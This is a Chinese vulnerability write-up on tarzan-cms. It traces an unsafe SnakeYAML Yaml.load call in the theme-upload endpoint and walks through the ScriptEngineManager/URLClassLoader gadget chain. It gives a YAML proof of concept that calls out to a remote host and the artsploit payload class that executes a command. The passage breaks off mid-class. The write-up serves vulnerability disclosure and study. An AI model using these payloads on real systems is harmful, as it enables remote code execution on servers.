---
title: tarzan-cms：snakeyaml反序列化(ScriptEngineManager利用链)
url: https://mp.weixin.qq.com/s/xc-kXLgLE0UPB6qPIsPJyw
source: Doonsec's feed
date: 2026-01-14
fetch_date: 2026-01-15T03:29:31.975264
---

# tarzan-cms：snakeyaml反序列化(ScriptEngineManager利用链)

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6LvQZHKPfrHwcfR93w7AtKEpaL47bUY2McORbqcVLYbA9SHJOpvHZ78aw/0?wx_fmt=jpeg)

# tarzan-cms：snakeyaml反序列化(ScriptEngineManager利用链)

原创

flowersboy

hutututu

![]()

在小说阅读器中沉浸阅读

#

## 首发于先知社区

## 环境搭建

源码：https://gitee.com/taisan/tarzan-cms

修改配置文件账密，导入数据库配置文件

![image-20260112102412264](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6LvbsBVuTpA5HocfYe7AxJhW4xS3mdqS7pSDibS3pnhDJE1lalARLm3fVA/640?wx_fmt=png&from=appmsg)

image-20260112102412264

## 漏洞挖掘

查看maven依赖：snakeyaml:1.27

![image-20260112102807624](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6LvBavWsS4icyQKaCdX1mMiczvO0AmYGkHrLM1SIXGJbYKt1Y44Lia1xnCLw/640?wx_fmt=png&from=appmsg)

image-20260112102807624

全局查找核心函数Yaml.load&Yaml.dump

> “
>
> * Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象；
> * Yaml.dump()：将一个对象转化为yaml文件形式

遍历zip数据，查找theme.yaml文件

找不到就返回null

找到就调用Yaml()解析器，解析内容映射键值对，获取name字段

```
    public static String getZipThemeName(InputStream is) throws IOException {
        ZipInputStream zis=new ZipInputStream(is);
        ZipEntry zipEntry = zis.getNextEntry();
        while (zipEntry != null) {
            if(zipEntry.getName().contains("theme.yaml")){
                Yaml yaml = new Yaml();
                Map<String,Object>  map=yaml.load(zis);
                return (String) map.get("name");
            }
            zipEntry = zis.getNextEntry();
        }
        return null;
    }
```

跟进getZipThemeName

![image-20260112110220671](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6Lv1hJILpnI1LgcWuJibx8VoeOHcUAA8SzN7hxnZgzosjrLXiceDFp4eNTw/640?wx_fmt=png&from=appmsg)

image-20260112110220671

在主题界面调用upload

```
    @CacheEvict(value = "theme", allEntries = true)
    public ResponseVo upload(byte[] bytes) {
        try {
            // 获取文件名
            String themeName =  getZipThemeName(new ByteArrayInputStream(bytes));
            if(StringUtil.isEmpty(themeName)){
                return  ResultUtil.error("主题模板解析异常");
            }
            String themePath = cmsProperties.getThemeDir() + File.separator+themeName;
            File themeDir = new File(themePath);
            // 创建文件根目录
            if (!themeDir.exists() && !themeDir.mkdirs()) {
                return  ResultUtil.error("创建文件夹失败");
            }
            if(!FileUtil.isEmpty(Paths.get(themePath))){
                return  ResultUtil.error("主题已安装");
            }
            FileUtil.unzip(bytes, Paths.get(themePath));
            Optional<File> themeRoot= Arrays.stream(themeDir.listFiles()).findFirst();
            FileUtil.copyFolder(Paths.get(themeRoot.get().getPath()),Paths.get(themePath));
            FileUtil.deleteFolder(Paths.get(themeRoot.get().getPath()));
            Theme theme=new Theme();
            theme.setName(themeName);
            theme.setImg("theme"+ File.separator+themeName+File.separator+"screenshot.png");
            theme.setStatus(0);
            save(theme);
        } catch (IOException e) {
            return  ResultUtil.error(e.getMessage());
        }
        return ResultUtil.success();
    }
```

跟进upload(byte[])方法

![image-20260112110323040](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6LvrgBWUGVdf48EtZPFaxBrIpaptnOibHCIbpnbxF42wVHJdQF7Z7vHfxQ/640?wx_fmt=png&from=appmsg)

image-20260112110323040

![image-20260112110401589](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6Lvyg6lZPCSANH3G2QTQzNVDtzpJeZeSGkl2Tia14wibFstKHhKjfZqyj6w/640?wx_fmt=png&from=appmsg)

image-20260112110401589

继续跟进download来到control层

![image-20260112110657440](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6LvpCYlRWJMxSTRFgS0dDxqc0BdCLhTB85KyUsj2nv1yA9IeFjHeiaLbjw/640?wx_fmt=png&from=appmsg)

image-20260112110657440

找到upload接口

```
@ResponseBody
@PostMapping("/upload")
public ResponseVo upload(@RequestParam(value = "file", required = false) MultipartFile file) {
    return themeService.upload(file);
}
```

## 利用链分析

javax/script/ScriptEngineManager.java

反序列化类的层层调用

![image-20260112112718491](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6LvYyVHnPsD59ufb5ibZVHu4iadENaMab5brdIhfsILnu1w7ggBVBVYEGbg/640?wx_fmt=png&from=appmsg)

image-20260112112718491

![image-20260112112854084](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6LvogDQqVBg9XEnPSqic3zzSPOHDsyvyibVWu7WKutcJjbVpayeoDMvJNSg/640?wx_fmt=png&from=appmsg)

image-20260112112854084

其中ServiceLoader

* prefix指定了远程SPI加载器的访问目录
* service指定了访问远程SPI加载器的具体文件
* loader指定了远程SPI加载器的地址

![image-20260112124609710](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6Lv3jtsORwG4pn3vw7iavzibdJWUxRBMP2ZZgkW1DX8We9UIJe8hkicsh9nw/640?wx_fmt=png&from=appmsg)

image-20260112124609710

回来继续分析iterator()

看到调用lookupIterator.hasNext()，继续跟进hasNext()

![image-20260112125423294](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6Lvtg90jhoztKNsK3EYYrej2F22WjD420qIjZFkAt5ZrlCIGBAz77BaDQ/640?wx_fmt=png&from=appmsg)

image-20260112125423294

![image-20260112125217563](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6LvvgX4Fdo7icPndeUSp2Qib9liadJ9doz4oicZFsq7f0S0Azicw0c74YcfPEA/640?wx_fmt=png&from=appmsg)

image-20260112125217563

继续跟进hasNextService()

![image-20260112125505010](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6LvfEyibKEiaD8j1viaa0NY8ibgpGZO3ydEoRGrhgOUPfmuiclVLYQGKNehw6w/640?wx_fmt=png&from=appmsg)

image-20260112125505010

fullName就是完整的资源地址

最终就是ServiceLoader.java文件寻找以上调用内容

```
PREFIX：META-INF/services/
service：javax.script.ScriptEngineFactory
loader：http://attacker.com
fullname：META-INF/services/javax.script.ScriptEngineFactory
```

## 漏洞利用

web界面找到主题管理处有上传zip包功能点

![image-20260112110810127](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6LvjL5TZG45rVkhkr22uDoS7I8soO4BIetiawr7Y4ojAmbcWxOAo614TDQ/640?wx_fmt=png&from=appmsg)

image-20260112110810127

POC：

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://ttzepj.dnslog.cn"]
  ]]
]
```

上传数据包测试

![image-20260112131013934](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6LvdTZvF3KJRFzl5LSCsmzoHph9UUnU1DIdRCCY3SKWhtjDemzY66HBPQ/640?wx_fmt=png&from=appmsg)

image-20260112131013934

得到回显

![image-20260112131026834](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6Lv4bIlv52P70mIEaxuESZSVibo1HR3ZXoPFqL1ibibhSBMxHGjA48CRTwicg/640?wx_fmt=png&from=appmsg)

image-20260112131026834

![image-20260112131105077](https://mmbiz.qpic.cn/sz_mmbiz_png/BZV1iaKS5fpqN59tiasibibVQWnwBUR3v6Lvb4sVADSkbnDHV6NEq9iaQf2dgicQ9ex0SM2U5S5eEicOazE56icbuaVQEw/640?wx_fmt=png&from=appmsg)

image-20260112131105077

利用现成项目https://github.com/artsploit/yaml-payload

```
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

...